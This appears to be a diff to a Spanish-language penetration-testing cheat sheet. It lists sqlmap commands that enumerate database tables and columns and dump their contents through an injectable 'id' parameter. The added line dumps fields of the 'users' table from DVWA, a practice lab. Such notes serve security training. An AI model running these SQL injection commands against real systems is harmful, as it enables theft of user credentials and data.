@@ -284,6 +284,8 @@ sqlmap -u http://[IP]/?id=1 -D database_name --tables
 
 sqlmap -u http://[IP]/?id=1 -D database_name -T table_name --columns
 
+sqlmap -r consulta.req -p id -D dvwa -T users -C campo1,campo2,campo3... --dump
+
 sqlmap -u http://[IP]/?id=1 -D database_name -T table_name --dump-all
 
 sqlmap -r request.req -p <parametro inyectable> --batch --dbs --> mediante archivo de petición guardado de Burp
